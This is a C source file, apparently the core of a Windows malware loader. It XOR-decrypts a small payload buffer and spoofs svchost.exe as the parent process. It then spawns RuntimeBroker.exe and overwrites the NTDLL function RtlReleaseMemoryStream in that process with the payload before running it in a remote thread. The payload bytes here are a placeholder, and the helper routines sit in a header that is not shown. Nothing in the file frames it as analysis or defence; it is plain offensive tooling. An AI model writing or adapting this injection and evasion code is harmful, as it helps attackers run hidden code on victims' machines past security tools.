#include "common.h"

int main()
{

	// Payload
	BYTE pPayload[] = { 0x3d, 0xf3, 0x34, 0x3c, 0x06, 0xa8, 0x3b, 0x81, 0x5c };
	SIZE_T sPayloadSize = 9;
	BYTE pKey[] = { 0x7c, 0x80, 0x50, 0x5a, 0x67, 0xdb, 0x5f, 0xe7, 0x56, 0xbb, 0xe7, 0x88, 0xf3, 0x92, 0x63, 0x2f, 0x0e, 0x78, 0xa8, 0x72, 0x90, 0x22, 0xeb, 0x2a, 0x24, 0x9e, 0x50, 0xae, 0x77, 0xf4, 0x2c, 0xc1 };

	for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
		if (j >= 32)
		{
			j = 0;
		}
		pPayload[i] = pPayload[i] ^ pKey[j];
	}
	
	// Retrieve parent PID for spoof
	DWORD dwParentID = NULL;
	HANDLE hParent = NULL;
	LPWSTR sProcessName = "svchost.exe";
	FindPPID(sProcessName, &hParent, &dwParentID);

	// Create spoofed windows process
	DWORD dwProcessID = 1;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPWSTR sCreate = "RuntimeBroker.exe";
	CreateSpoofedProcess(hParent, sCreate, &dwProcessID, &hProcess, &hThread);
	
	// Stomp an imported function within spoofed process
	LPCWSTR sStompModule = L"NTDLL.DLL";
	LPCSTR sStompFunction = "RtlReleaseMemoryStream";
	PVOID pAddress = StompRemoteFunction(hProcess, sStompModule, sStompFunction, pPayload, sPayloadSize);

	// Execute a thread of stomped function
	RemoteThreadExecute(hProcess, pAddress);

	return EXIT_SUCCESS;
}